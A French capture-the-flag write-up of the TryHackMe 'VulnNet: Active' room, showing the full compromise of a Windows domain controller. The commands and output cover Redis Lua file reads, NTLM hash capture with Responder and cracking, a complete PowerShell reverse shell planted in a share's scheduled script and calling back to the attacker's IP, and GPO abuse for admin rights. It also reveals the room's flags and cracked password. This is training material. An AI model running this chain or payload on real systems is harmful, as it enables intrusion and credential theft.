# VulnNet: Active #

## Task 1 VulnNet: Active ## 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.239.161 active.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A active.thm -p- -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 14:20 CET
Nmap scan report for active.thm (10.10.239.161)
Host is up (0.054s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-31T13:29:17
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   37.21 ms 10.9.0.1
2   37.67 ms active.thm (10.10.239.161)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 590.52 seconds

```

Nmap nous indique beaucoup de services.  
Les services importants sont sure le port 139,445 et 6379.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ smbclient -L \\\\active.thm
Enter WORKGROUP\tim's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Sur le serveur smb on trouve rien.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ crackmapexec smb active.thm
SMB         10.10.239.161   445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```

On crack le host name qui est : VULNNET-BC3TCK1.   

Sur le port 6379 on a le service redis on va faire une énumération.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ redis-cli -h active.thm
active.thm:6379> config GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
active.thm:6379> 
```

On regarde la configuration est on remarque un chemin d'un utilisateur qui est : C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402  

**What is the user flag? (Desktop\user.txt)**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ redis-cli -h active.thm -p 6379 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0
(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
```

On modifie le chemin pour lire fichier user.txt.   
On a une partie du flag qui est : 3eb176aee96432d5b100bc93580b291e   
On devine que le flag complet est : THM{3eb176aee96432d5b100bc93580b291e}

**What is the system flag? (Desktop\system.txt)**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.9.228.66]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XAEACNN1TZ3]
    Responder Domain Name      [WVLJ.LOCAL]
    Responder DCE-RPC Port     [47803]

[+] Listening for events...
```

On exécute responder pour récuperer le NTLM hash.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ redis-cli -h active.thm -p 6379 eval "dofile('//10.9.228.66//share')" 0
(error) ERR Error running script (call to f_61eceb7634faa405db0f9703dbff7984e41db0cd): @user_script:1: cannot open //10.9.228.66//share: Permission denied 
```

On demande à la machine de cible de se reconnecter sur notre machine.  

```bash
[SMB] NTLMv2-SSP Client   : 10.10.239.161
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:c44b2de070e862b3:CE429C31A748825AC35883B29997B130:0101000000000000805CE54267CED701821DE437BACBA3FC0000000002000800570056004C004A0001001E00570049004E002D00580041004500410043004E004E00310054005A00330004003400570049004E002D00580041004500410043004E004E00310054005A0033002E00570056004C004A002E004C004F00430041004C0003001400570056004C004A002E004C004F00430041004C0005001400570056004C004A002E004C004F00430041004C0007000800805CE54267CED7010600040002000000080030003000000000000000000000000030000016F7CA8CFC0EAEA3EBC7AA8C8CB3EDDFC45FB1DBC47F1A8DA85795C33E77DB3A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E0039002E003200320038002E00360036000000000000000000
```

On récupère le hash.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo 'enterprise-security::VULNNET:c44b2de070e862b3:CE429C31A748825AC35883B29997B130:0101000000000000805CE54267CED701821DE437BACBA3FC0000000002000800570056004C004A0001001E00570049004E002D00580041004500410043004E004E00310054005A00330004003400570049004E002D00580041004500410043004E004E00310054005A0033002E00570056004C004A002E004C004F00430041004C0003001400570056004C004A002E004C004F00430041004C0005001400570056004C004A002E004C004F00430041004C0007000800805CE54267CED7010600040002000000080030003000000000000000000000000030000016F7CA8CFC0EAEA3EBC7AA8C8CB3EDDFC45FB1DBC47F1A8DA85795C33E77DB3A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E0039002E003200320038002E00360036000000000000000000' > hash

tim@kali:~/Bureau/tryhackme/write-up$ hashcat -a0 -m 5600 hash /usr/share/wordlists/rockyou.txt --quiet
ENTERPRISE-SECURITY::VULNNET:c44b2de070e862b3:ce429c31a748825ac35883b29997b130:0101000000000000805ce54267ced701821de437bacba3fc0000000002000800570056004c004a0001001e00570049004e002d00580041004500410043004e004e00310054005a00330004003400570049004e002d00580041004500410043004e004e00310054005a0033002e00570056004c004a002e004c004f00430041004c0003001400570056004c004a002e004c004f00430041004c0005001400570056004c004a002e004c004f00430041004c0007000800805ce54267ced7010600040002000000080030003000000000000000000000000030000016f7ca8cfc0eaea3ebc7aa8c8cb3eddfc45fb1dbc47f1a8da85795c33e77db3a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e0039002e003200320038002e00360036000000000000000000:sand_0873959498
```

On casse le hash et on a le mot de passe qui est : sand_0873959498   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ smbclient -L \\\\active.thm -U enterprise-security@vulnnet.local
Enter enterprise-security@vulnnet.local's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Enterprise-Share Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Enumère le partage on voit un partage Enterprise-Share.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ smbclient \\\\active.thm\\Enterprise-Share -U enterprise-security@vulnnet.local
Enter enterprise-security@vulnnet.local's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb 23 23:45:41 2021
  ..                                  D        0  Tue Feb 23 23:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 01:33:18 2021

		9558271 blocks of size 4096. 5129544 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1 
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \> exit
tim@kali:~/Bureau/tryhackme/write-up$ cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

On se connecte au partage Enterprise-Share et on récupère un fichier script qui éfface juste le fichier dans le Document.  
Si le partage est disponnible en écriture on peut lui mettre un reverse shell.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat PurgeIrrelevantData_1826.ps1 
$client = New-Object System.Net.Sockets.TCPClient('10.9.228.66',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

On met un reverse shell dans le fichier PurgeIrrelevantData_1826.ps1.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/timruff/nc.exe/raw/master/nc.exe -nv 
2021-10-31 15:51:30 URL:https://raw.githubusercontent.com/timruff/nc.exe/master/nc.exe [38616/38616] -> "nc.exe" [1]

tim@kali:~/Bureau/tryhackme/write-up$ smbclient \\\\active.thm\\Enterprise-Share -U enterprise-security@vulnnet.local
Enter enterprise-security@vulnnet.local's password: 
Try "help" to get a list of possible commands.
smb: \> put PurgeIrrelevantData_1826.ps1 
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (2,9 kb/s) (average 2,9 kb/s)
smb: \> put nc.exe 
putting file nc.exe as \nc.exe (31,4 kb/s) (average 22,6 kb/s)
```

On met notre reverse shell et nc.exe dans le partage.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

On écoute le port 1234 pour avoir un shell.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.239.161.
Ncat: Connection from 10.10.239.161:50052.
PS C:\Users\enterprise-security\Downloads> whoami
vulnnet\enterprise-security
```

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1337
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
```

On écoute le port 1337 pour avoir un reverse shell amélioré.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1337
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.111.92.
Ncat: Connection from 10.10.111.92:49916.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\enterprise-security\Downloads>
```

On obtient le shell.  

```bash
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads> net user enterprise-security
User name                    enterprise-security
Full Name                    Enterprise Security
Comment                      TryHackMe
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2021 4:01:55 PM
Password expires             Never
Password changeable          2/24/2021 4:01:55 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/31/2021 11:37:09 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

On regarde si on peut avoir plus de privilège. 


```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe -nv
2021-10-31 19:55:26 URL:https://raw.githubusercontent.com/byronkg/SharpGPOAbuse/main/SharpGPOAbuse-master/SharpGPOAbuse.exe [80896/80896] -> "SharpGPOAbuse.exe" [1]

smb: \> put SharpGPOAbuse.exe 
putting file SharpGPOAbuse.exe as \SharpGPOAbuse.exe (84,9 kb/s) (average 69,8 kb/s)
```

On met sur la machine cible SharpGPOAbuse qui permet d'ajouter le groupe Administrator à un utilisateur.

```bash
PS C:\Enterprise-Share>  .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!

PS C:\>  net user enterprise-security
User name                    enterprise-security
Full Name                    Enterprise Security
Comment                      TryHackMe
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2021 4:01:37 PM
Password expires             Never
Password changeable          2/24/2021 4:01:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/31/2021 11:37:09 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         
The command completed successfully.


```

On ajoute le groupe administrators.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ smbclient \\\\active.thm\\C$ -U enterprise-security@vulnnet.local
Enter enterprise-security@vulnnet.local's password: 
Try "help" to get a list of possible commands.
smb: \> cd \users\Administrator\Desktop\
smb: \users\Administrator\Desktop\> get system.txt 
getting file \users\Administrator\Desktop\system.txt of size 37 as system.txt (0,1 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \users\Administrator\Desktop\> exit
tim@kali:~/Bureau/tryhackme/write-up$ cat system.txt 
THM{d540c0645975900e5bb9167aa431fc9b}

```

On se connecte sur le C: avec smbclient.   
On récupère le fichier system.txt et on le lit.  
Le flag est : THM{d540c0645975900e5bb9167aa431fc9b}   

